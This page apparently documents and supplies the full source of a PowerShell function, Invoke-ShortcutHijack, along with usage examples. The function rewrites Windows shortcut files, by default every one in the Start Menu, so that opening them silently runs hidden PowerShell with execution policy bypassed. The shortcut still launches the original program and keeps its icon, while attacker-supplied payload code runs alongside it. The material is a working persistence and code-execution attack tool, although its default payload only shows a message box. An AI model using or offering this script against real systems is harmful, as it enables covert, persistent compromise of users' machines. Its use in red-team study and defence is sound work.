
Hijack Shortcuts
This function, Invoke-ShortcutHijack, is designed to modify specified shortcut (.lnk) files by altering their target paths to point to a designated PowerShell executable (hardcoded to "powershell.exe" in the current version). It works by locating shortcut files—either through direct file path input or by searching default directories such as the Start Menu—and then loading each as a COM object. For each shortcut, the function captures the original target, constructs a new command that first launches the original application to preserve its intended functionality, and then appends custom payload code. The default payload displays a "Hacked" message box (after loading necessary GUI assemblies), but users can supply their own payload to execute additional commands. In this way, the function seamlessly hijacks shortcuts to maintain their original behavior while enabling extra actions, making it a powerful tool for both administrative automation and demonstration purposes.

Syntax

# Example 1: Hijack shortcuts found in the default Start Menu
# Uses the default payload which loads necessary GUI assemblies and shows a message box "Hacked"
Invoke-ShortcutHijack

# Example 2: Hijack specific shortcuts (by full file paths)
Invoke-ShortcutHijack -ShortcutPaths "C:\Users\Alice\Desktop\example.lnk", "C:\Users\Alice\Desktop\other.lnk" -PayloadCode "Write-Host 'Payload activated'"

# Example 3: Search a specified directory for shortcuts to hijack, using a custom payload
Invoke-ShortcutHijack -SearchDirectory "C:\temp" -PayloadCode "Write-Host 'Custom payload executed'"

# Example 4: Hijack a specific shortcut with a custom payload
Invoke-ShortcutHijack -ShortcutPaths "C:\Users\Alice\Desktop\test.lnk" -PayloadCode "Write-Host 'Payload activated'"
      
Copy
Script

function Invoke-ShortcutHijack {
    [CmdletBinding()]
    Param(
        # Optional: Provide one or more full paths to shortcut (.lnk) files to hijack.
        [Parameter(Mandatory=$false)]
        [string[]]$ShortcutPaths,
        # Optional: If no specific shortcuts are provided, search this directory (and subdirectories) for .lnk files.
        [Parameter(Mandatory=$false)]
        [string]$SearchDirectory,
        # The payload code to inject into the shortcut. Defaults to a message box.
        [Parameter(Mandatory=$false)]
        [string]$PayloadCode = "Add-Type -AssemblyName PresentationCore,PresentationFramework; [System.Windows.MessageBox]::Show('Hacked')"
    )

    # Create the COM object needed to interact with shortcuts.
    $shell = New-Object -ComObject WScript.Shell

    # Determine the list of shortcut files.
    if ($ShortcutPaths -and $ShortcutPaths.Count -gt 0) {
        $shortcutFiles = foreach ($sp in $ShortcutPaths) {
            if (Test-Path $sp) { Get-Item $sp }
            else { Write-Warning "Shortcut not found: $sp" }
        }
    }
    elseif ($SearchDirectory) {
        $shortcutFiles = Get-ChildItem -Path $SearchDirectory -Filter *.lnk -Recurse -ErrorAction SilentlyContinue
    }
    else {
        # Default to searching common Start Menu directories.
        $userStartMenu = [System.Environment]::GetFolderPath('StartMenu')
        $commonStartMenu = $shell.SpecialFolders.Item('AllUsersStartMenu')
        $shortcutFiles = Get-ChildItem -Path $userStartMenu, $commonStartMenu -Filter *.lnk -Recurse -ErrorAction SilentlyContinue
    }
    if (-not $shortcutFiles) {
        Write-Host "No shortcut files found."
        return
    }

    # Always use powershell.exe as the target shell.
    $targetShell = "powershell.exe"
    
    foreach ($file in $shortcutFiles) {
        try {
            # Create a shortcut object from the file.
            $link = $shell.CreateShortcut($file.FullName)
            $originalTarget = $link.TargetPath
            
            # Adjust IconLocation if it's empty or too short.
            $iconLocation = $link.IconLocation
            if ([string]::IsNullOrEmpty($iconLocation) -or $iconLocation.Length -lt 4) {
                $iconLocation = "$originalTarget"
            }
            
            # Build new arguments to launch the original target then execute the payload.
            # Note: We're using -ExecutionPolicy Bypass and the -Command parameter.
            $newArgs = "-w h -ExecutionPolicy Bypass -Command `"Start-Process '$originalTarget'; $PayloadCode`""
            
            # Update the shortcut properties.
            $link.Arguments = $newArgs
            $link.TargetPath = $targetShell
            $link.IconLocation = $iconLocation
            
            # Save the changes.
            $link.Save()
            Write-Host "Hijacked shortcut: $($file.FullName)"
        }
        catch {
            Write-Warning "Failed to hijack shortcut: $($file.FullName). Error: $_"
        }
    }
}